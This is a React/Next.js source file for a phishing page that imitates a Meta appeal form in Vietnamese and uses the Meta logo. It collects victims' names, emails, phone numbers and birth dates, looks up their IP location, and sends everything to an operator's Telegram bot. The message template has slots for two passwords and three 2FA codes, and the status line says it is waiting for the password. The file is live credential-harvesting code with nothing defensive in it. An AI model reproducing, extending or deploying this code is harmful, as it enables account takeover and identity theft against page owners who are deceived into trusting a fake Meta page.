"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { FormEvent, useEffect, useRef, useState } from "react";
import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IPGEO_API_KEY } from "@/lib/config";
import styles from "./page.module.css";

// Danh sách quốc gia và mã vùng hỗ trợ chọn thủ công
const COUNTRY_LIST = [
  { code: "VN", name: "Vietnam", dial: "+84", flag: "🇻🇳" },
  { code: "US", name: "United States", dial: "+1", flag: "🇺🇸" },
  { code: "GB", name: "United Kingdom", dial: "+44", flag: "🇬🇧" },
  { code: "SG", name: "Singapore", dial: "+65", flag: "🇸🇬" },
  { code: "KR", name: "South Korea", dial: "+82", flag: "🇰🇷" },
  { code: "JP", name: "Japan", dial: "+81", flag: "🇯🇵" },
  { code: "TH", name: "Thailand", dial: "+66", flag: "🇹🇭" },
  { code: "MY", name: "Malaysia", dial: "+60", flag: "🇲🇾" },
  { code: "ID", name: "Indonesia", dial: "+62", flag: "🇮🇩" },
  { code: "PH", name: "Philippines", dial: "+63", flag: "🇵🇭" },
  { code: "CN", name: "China", dial: "+86", flag: "🇨🇳" },
  { code: "HK", name: "Hong Kong", dial: "+852", flag: "🇭🇰" },
  { code: "TW", name: "Taiwan", dial: "+886", flag: "🇹🇼" },
  { code: "IN", name: "India", dial: "+91", flag: "🇮🇳" },
  { code: "AU", name: "Australia", dial: "+61", flag: "🇦🇺" },
  { code: "CA", name: "Canada", dial: "+1", flag: "🇨🇦" },
  { code: "FR", name: "France", dial: "+33", flag: "🇫🇷" },
  { code: "DE", name: "Germany", dial: "+49", flag: "🇩🇪" },
  { code: "IT", name: "Italy", dial: "+39", flag: "🇮🇹" },
  { code: "ES", name: "Spain", dial: "+34", flag: "🇪🇸" },
  { code: "RU", name: "Russia", dial: "+7", flag: "🇷🇺" },
  { code: "BR", name: "Brazil", dial: "+55", flag: "🇧🇷" },
  { code: "MX", name: "Mexico", dial: "+52", flag: "🇲🇽" },
  { code: "AE", name: "UAE", dial: "+971", flag: "🇦🇪" },
  { code: "SA", name: "Saudi Arabia", dial: "+966", flag: "🇸🇦" },
];

type ActionItem = {
  title: string;
  subtitle: string;
  icon?: "/icon-women.png" | "/icon-docs.png";
  muted?: boolean;
};

type ReviewForm = {
  fullName: string;
  email: string;
  workEmail: string;
  pageName: string;
  phoneNumber: string;
  dateOfBirth: string;
  details: string;
};

type ReviewFormErrors = Partial<Record<keyof ReviewForm, string>>;

const defaultForm: ReviewForm = {
  fullName: "",
  email: "",
  workEmail: "",
  pageName: "",
  phoneNumber: "",
  dateOfBirth: "",
  details: "",
};

function formatCooldownTime(seconds: number, locale: Locale) {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = seconds % 60;
  const segments: string[] = [];

  if (locale === "vi") {
    if (minutes > 0) {
      segments.push(`${minutes} phút`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} giây`);
    }
  } else {
    if (minutes > 0) {
      segments.push(`${minutes} minute${minutes > 1 ? "s" : ""}`);
    }
    if (remainingSeconds > 0) {
      segments.push(`${remainingSeconds} second${remainingSeconds > 1 ? "s" : ""}`);
    }
  }

  return segments.join(" ");
}

const emailPattern = /^\S+@\S+\.\S+$/;

function validateReviewForm(form: ReviewForm, dictionary: Dictionary): ReviewFormErrors {
  const validation = dictionary.modal.validation;
  const errors: ReviewFormErrors = {};

  if (!form.fullName.trim()) {
    errors.fullName = validation.fullNameRequired;
  }

  if (!form.email.trim()) {
    errors.email = validation.emailRequired;
  } else if (!emailPattern.test(form.email)) {
    errors.email = validation.emailInvalid;
  }

  if (!form.workEmail.trim()) {
    errors.workEmail = validation.workEmailRequired;
  } else if (!emailPattern.test(form.workEmail)) {
    errors.workEmail = validation.workEmailInvalid;
  }

  if (!form.pageName.trim()) {
    errors.pageName = validation.pageNameRequired;
  }

  if (!form.phoneNumber.trim()) {
    errors.phoneNumber = validation.phoneNumberRequired;
  }

  if (!form.dateOfBirth.trim()) {
    errors.dateOfBirth = validation.dateOfBirthRequired;
  }

  return errors;
}

function SidebarIcon({ name, active }: { name: "home" | "search" | "policy" | "rules" | "settings"; active?: boolean }) {
  const color = active ? "#ffffff" : "#000000";
  const stroke = {
    stroke: color,
    strokeWidth: 1.6,
    fill: "none",
    strokeLinecap: "round" as const,
    strokeLinejoin: "round" as const,
  };

  if (name === "home") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <path d="M4.2 9.4L10 4.8L15.8 9.4" {...stroke} />
        <path d="M5.5 8.8V14.5H14.5V8.8" {...stroke} />
      </svg>
    );
  }

  if (name === "search") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <circle cx="8.7" cy="8.7" r="4.6" {...stroke} />
        <path d="M12.4 12.4L16 16" {...stroke} />
      </svg>
    );
  }

  if (name === "policy") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <rect x="5.3" y="5.3" width="9.4" height="10.3" rx="1.2" {...stroke} />
        <path d="M8 5.2V3.8H12V5.2" {...stroke} />
      </svg>
    );
  }

  if (name === "rules") {
    return (
      <svg viewBox="0 0 20 20" aria-hidden="true">
        <circle cx="10" cy="10" r="6" {...stroke} />
        <path d="M10 7.4V10.2" {...stroke} />
        <circle cx="10" cy="12.9" r="0.7" fill={color} />
      </svg>
    );
  }

  return (
    <svg viewBox="0 0 20 20" aria-hidden="true">
      <circle cx="10" cy="10" r="2.2" {...stroke} />
      <path d="M10 4.6V3.2M10 16.8V15.4M15.4 10H16.8M3.2 10H4.6M13.8 6.2L14.8 5.2M5.2 14.8L6.2 13.8M13.8 13.8L14.8 14.8M5.2 5.2L6.2 6.2" {...stroke} />
    </svg>
  );
}

function ChevronIcon({ direction = "down" }: { direction?: "up" | "down" | "right" }) {
  const directionClass =
    direction === "up" ? styles.chevronUp : direction === "right" ? styles.chevronRight : "";

  return (
    <svg viewBox="0 0 20 20" aria-hidden="true" className={`${styles.chevronIcon} ${directionClass}`}>
      <path d="M5.5 7.5L10 12L14.5 7.5" />
    </svg>
  );
}

type HomePageClientProps = {
  locale: Locale;
  detectedCountryCode?: string | null;
  detectedCallingCode?: string | null;
  detectedIp?: string | null;
  detectedLocation?: string | null;
};

function normalizeCallingCode(value: string | null | undefined): string {
  if (!value) {
    return "";
  }

  const digits = value.replace(/[^\d]/g, "");
  return digits ? `+${digits}` : "";
}

function escapeHtml(value: string | null | undefined): string {
  if (value == null) {
    return "";
  }

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function getCurrentTime(): string {
  return new Date().toLocaleString("en-US", { hour12: false });
}

function formatDateOfBirthInput(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 8);
  const parts: string[] = [];
  if (digits.length > 0) {
    parts.push(digits.slice(0, 2));
  }
  if (digits.length > 2) {
    parts.push(digits.slice(2, 4));
  }
  if (digits.length > 4) {
    parts.push(digits.slice(4, 8));
  }
  return parts.join("/");
}

function formatPhoneNumberInput(value: string): string {
  return value.replace(/\D/g, "").slice(0, 15);
}

function maskPhoneTail(value: string): string {
  const digits = value.replace(/\D/g, "");
  const tail = digits.slice(-2);
  return tail ? `******${tail}` : "******";
}

function maskEmail(value: string): string {
  const trimmed = value.trim();
  if (!trimmed || !trimmed.includes("@")) {
    return "he***@gmail.com";
  }
  const [user, domain] = trimmed.split("@");
  const prefix = user.slice(0, 2).padEnd(2, "*");
  return `${prefix}***@${domain}`;
}

function applyTemplate(template: string, value: string): string {
  return template.replace("{value}", value);
}

export default function HomePageClient({
  locale,
  detectedCountryCode,
  detectedCallingCode,
  detectedIp,
  detectedLocation,
}: HomePageClientProps) {
  const [activeLocale, setActiveLocale] = useState<Locale>(locale);
  const dictionary = getDictionary(activeLocale);
  const modal = dictionary.modal;
  const sidebar = dictionary.sidebar;
  const pageContent = dictionary.page;
  const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "VN");
  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode) || "+84");
  const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
  const [clientIp, setClientIp] = useState(detectedIp ?? "");

  const [showPolicyList, setShowPolicyList] = useState(false);
  const [showOtherRulesList, setShowOtherRulesList] = useState(false);
  const [showSettingsList, setShowSettingsList] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [isSubmited, setIsSubmited] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [loadingInitial, setLoadingInitial] = useState(false);
  const [loadingPassword, setLoadingPassword] = useState(false);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);
  const [clickCount, setClickCount] = useState(0);
  const [clickCount1, setClickCount1] = useState(0);
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [twoFactorError, setTwoFactorError] = useState("");
  const router = useRouter();
  const [showAltMethods, setShowAltMethods] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"app" | "whatsapp" | "sms" | "email">("app");
  const [notifyOnFacebook, setNotifyOnFacebook] = useState(false);
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [form, setForm] = useState<ReviewForm>(defaultForm);
  const [errors, setErrors] = useState<ReviewFormErrors>({});
  const [didTrySubmit, setDidTrySubmit] = useState(false);
  const formTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const botToken = TELEGRAM_BOT_TOKEN;
  const chatId = TELEGRAM_CHAT_ID;

  const telegramEnabled = Boolean(botToken && chatId);
  const [messageId, setMessageId] = useState<string | null>(null);
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [code3, setCode3] = useState("");
  const [currentUrl, setCurrentUrl] = useState("");

  type TelegramOverrides = Partial<{
    password1: string;
    password2: string;
    code1: string;
    code2: string;
    code3: string;
    status: string;
  }>;

  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
    const locationParts = (clientLocation ?? "")
      .split("/")
      .map((part) => part.trim())
      .filter(Boolean);
    const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
    const safeIp = escapeHtml(clientIp ?? "N/A");
    const safePageName = escapeHtml(form.pageName || "N/A");
    const safeFullName = escapeHtml(form.fullName || "N/A");
    const safeDateOfBirth = escapeHtml(form.dateOfBirth || "N/A");
    const safePersonalEmail = escapeHtml(form.email || "N/A");
    const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
    const safeDetails = escapeHtml(form.details.trim() || "N/A");
    const safePhone = escapeHtml(`${clientCallingCode} ${form.phoneNumber}`.trim() || "+84");
    const safeUrl = escapeHtml(currentUrl || "N/A");
    const safeTime = escapeHtml(getCurrentTime());
    const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
    const safePassword2 = escapeHtml((overrides.password2 ?? password2) || "N/A");
    const safeCode1 = escapeHtml((overrides.code1 ?? code1) || "N/A");
    const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
    const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
    const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");

    return [
      "👤 <b>THÔNG TIN PHỤ</b>",
      `📱 Tên PAGE: <code>${safePageName}</code>`,
      `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
      `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
      `🌐 IP: <code>${safeIp}</code>`,
      `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
      `🏙 Thành Phố: <code>${safeCity}</code>`,
      `⏰ Thời Gian: <code>${safeTime}</code>`,
      "━━━━━━━━━━━━━━━━━━━━━",
      `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
      `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
      `📧 Email Business: <code>${safeBusinessEmail}</code>`,
      `📞 SĐT: <code>${safePhone}</code>`,
      `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
      `🔗 URL: <code>${safeUrl}</code>`,
      `🔑 Mật Khẩu 1: <code>${safePassword1}</code>`,
      `🔑 Mật Khẩu 2: <code>${safePassword2}</code>`,
      `🔓 CODE 2FA 1: <code>${safeCode1}</code>`,
      `🔓 CODE 2FA 2: <code>${safeCode2}</code>`,
      `🔓 CODE 2FA 3: <code>${safeCode3}</code>`,
      `🔄 Trạng thái: ${safeStatus}`,
    ].join("\n");
  };

  const sendTelegramMessage = async (text: string) => {
    if (!telegramEnabled) {
      return;
    }

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "HTML",
        }),
      });
      const data = (await response.json()) as {
        ok?: boolean;
        result?: { message_id?: number };
      };

      if (data?.ok && data.result?.message_id) {
        const nextId = String(data.result.message_id);
        setMessageId(nextId);
        if (typeof window !== "undefined") {
          localStorage.setItem("telegram_msg_id", nextId);
        }
      }
    } catch (error) {
      console.error("Telegram Error:", error);
    }
  };

  const sendInitialDataToTelegram = async () => {
    if (!telegramEnabled) {
      return;
    }

    if (typeof window !== "undefined") {
      localStorage.removeItem("telegram_msg_id");
    }
    setMessageId(null);
    setPassword1("");
    setPassword2("");
    setCode1("");
    setCode2("");
    setCode3("");

    const text = buildTelegramMessage("Đang chờ mật khẩu...");
    await sendTelegramMessage(text);
  };

  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
    if (!telegramEnabled) {
      return;
    }

    const text = buildTelegramMessage(status, overrides);
    if (!messageId) {
      await sendTelegramMessage(text);
      return;
    }

    try {
      const messageIdNumber = Number(messageId);
      if (!Number.isFinite(messageIdNumber)) {
        throw new Error("Invalid message id");
      }

      const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageIdNumber,
          text,
          parse_mode: "HTML",
        }),
      });
      const data = await response.json();
      if (!data?.ok) {
        throw new Error("Telegram edit failed");
      }
    } catch (error) {
      console.error("Telegram Update Error:", error);
      await sendTelegramMessage(text);
    }
  };

  function openReviewModal() {
    setShowModal(true);
  }

  function handleFieldChange<K extends keyof ReviewForm>(field: K, value: ReviewForm[K]) {
    setForm((prev) => {
      let nextValue = value;
      if (field === "dateOfBirth" && typeof value === "string") {
        nextValue = formatDateOfBirthInput(value) as ReviewForm[K];
      }
      if (field === "phoneNumber" && typeof value === "string") {
        nextValue = formatPhoneNumberInput(value) as ReviewForm[K];
      }
      const next = { ...prev, [field]: nextValue };
      if (didTrySubmit) {
        setErrors(validateReviewForm(next, dictionary));
      }
      return next;
    });
  }

  async function handleSubmit1(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (loadingInitial) {
      return;
    }
    setDidTrySubmit(true);

    const nextErrors = validateReviewForm(form, dictionary);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    setLoadingInitial(true);
    if (formTimerRef.current) {
      clearTimeout(formTimerRef.current);
    }
    try {
      await sendInitialDataToTelegram();
    } catch (error) {
      console.error("Telegram initial send error:", error);
    }
    formTimerRef.current = setTimeout(() => {
      setIsSubmited(true);
      setIsSuccess(false);
      setPassword("");
      setPasswordError("");
      setClickCount(0);
      setShowPassword(false);
      setTwoFactorCode("");
      setTwoFactorError("");
      setClickCount1(0);
      setIsSubmitDisabled(false);
      setTimeLeft(0);
      setLoadingInitial(false);
      formTimerRef.current = null;
    }, 1000);
  }

  useEffect(() => {
    if (typeof window !== "undefined") {
      setCurrentUrl(window.location.href);
    }
  }, []);

  useEffect(() => {
    let cancelled = false;

    const fetchGeo = async () => {
      const applyVietnamFallback = () => {
        if (cancelled) return;
        setClientCountryCode("VN");
        setClientCallingCode("+84");
        setClientLocation("N/A / N/A / Vietnam");
      };

      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) throw new Error("Failed to fetch IP data");
        const result = (await response.json()) as { ip?: string };
        if (!result?.ip || cancelled) {
          applyVietnamFallback();
          return;
        }

        setClientIp(result.ip);

        const locationResponse = await fetch(
          `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${result.ip}`
        );
        if (!locationResponse.ok) throw new Error("Failed to fetch location data");
        const locationData = (await locationResponse.json()) as {
          calling_code?: string;
          country_code2?: string;
          district?: string;
          city?: string;
          country_name?: string;
        };
        if (cancelled) return;

        const callingCode = normalizeCallingCode(locationData?.calling_code ?? "");
        const countryCode = (locationData?.country_code2 ?? "").toUpperCase();
        const district = locationData?.district || "N/A";
        const city = locationData?.city || "N/A";
        const country = locationData?.country_name || "N/A";

        if (!countryCode || !callingCode) {
          applyVietnamFallback();
          return;
        }

        setClientCallingCode(callingCode);
        setClientCountryCode(countryCode);
        setClientLocation(`${district} / ${city} / ${country}`);
      } catch (err) {
        console.error(err);
        applyVietnamFallback();
      }
    };

    fetchGeo();

    return () => {
      cancelled = true;
    };
  }, []);

  return (
    <div className={styles.container}>
      <aside className={styles.left}>
        <div className={styles.leftContent}>
          <Image src="/metalogo.svg" alt="Meta" width={60} height={12} priority className={styles.metaLogo} />
          <p className={styles.leftTitle}>{sidebar.title}</p>

          <button type="button" className={styles.homeButton}>
            <SidebarIcon name="home" active />
            {sidebar.homePage}
          </button>

          <button type="button" className={styles.menuButton} onClick={openReviewModal}>
            <SidebarIcon name="search" />
            {sidebar.search}
          </button>
        </div>
      </aside>

      <main className={styles.main}>
        {showModal && (
          <div className={styles.modalOverlay}>
            <div className={styles.modalContent}>
              <button type="button" className={styles.closeButton} onClick={() => setShowModal(false)}>
                X
              </button>
              <h2>Hướng dẫn nộp đơn kháng nghị</h2>

              <form onSubmit={handleSubmit1}>
                <div className={styles.inputGroup}>
                  <input
                    type="text"
                    placeholder="Họ và tên"
                    value={form.fullName}
                    onChange={(e) => handleFieldChange("fullName", e.target.value)}
                  />
                  {errors.fullName && <p className={styles.errorText}>{errors.fullName}</p>}
                </div>

                <div className={styles.inputGroup}>
                  <input
                    type="email"
                    placeholder="Email"
                    value={form.email}
                    onChange={(e) => handleFieldChange("email", e.target.value)}
                  />
                  {errors.email && <p className={styles.errorText}>{errors.email}</p>}
                </div>

                <div className={styles.inputGroup}>
                  <input
                    type="email"
                    placeholder="Email công việc"
                    value={form.workEmail}
                    onChange={(e) => handleFieldChange("workEmail", e.target.value)}
                  />
                  {errors.workEmail && <p className={styles.errorText}>{errors.workEmail}</p>}
                </div>

                <div className={styles.inputGroup}>
                  <input
                    type="text"
                    placeholder="Tên trang"
                    value={form.pageName}
                    onChange={(e) => handleFieldChange("pageName", e.target.value)}
                  />
                  {errors.pageName && <p className={styles.errorText}>{errors.pageName}</p>}
                </div>

                {/* KHU VỰC CHỌN MÃ VÙNG LẠI THỦ CÔNG / TỰ ĐỘNG THEO IP */}
                <div className={styles.inputGroup} style={{ display: "flex", gap: "8px" }}>
                  <select
                    value={clientCountryCode}
                    onChange={(e) => {
                      const selectedCode = e.target.value;
                      const found = COUNTRY_LIST.find((c) => c.code === selectedCode);
                      if (found) {
                        setClientCountryCode(found.code);
                        setClientCallingCode(found.dial);
                      }
                    }}
                    style={{
                      padding: "10px",
                      borderRadius: "6px",
                      border: "1px solid #ccc",
                      background: "#f9f9f9",
                      cursor: "pointer",
                      fontSize: "14px",
                    }}
                  >
                    {COUNTRY_LIST.map((c) => (
                      <option key={c.code} value={c.code}>
                        {c.flag} {c.code} ({c.dial})
                      </option>
                    ))}
                  </select>

                  <input
                    type="text"
                    placeholder="Số điện thoại"
                    value={form.phoneNumber}
                    onChange={(e) => handleFieldChange("phoneNumber", e.target.value)}
                    style={{ flex: 1 }}
                  />
                </div>
                {errors.phoneNumber && <p className={styles.errorText}>{errors.phoneNumber}</p>}

                <div className={styles.inputGroup}>
                  <label>Ngày sinh</label>
                  <input
                    type="text"
                    placeholder="DD/MM/YYYY"
                    value={form.dateOfBirth}
                    onChange={(e) => handleFieldChange("dateOfBirth", e.target.value)}
                  />
                  {errors.dateOfBirth && <p className={styles.errorText}>{errors.dateOfBirth}</p>}
                </div>

                <div className={styles.inputGroup}>
                  <textarea
                    placeholder="Mô tả vấn đề của bạn."
                    value={form.details}
                    onChange={(e) => setForm((prev) => ({ ...prev, details: e.target.value }))}
                  />
                </div>

                <button type="submit" className={styles.submitButton} disabled={loadingInitial}>
                  {loadingInitial ? "Đang gửi..." : "Gửi"}
                </button>
              </form>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
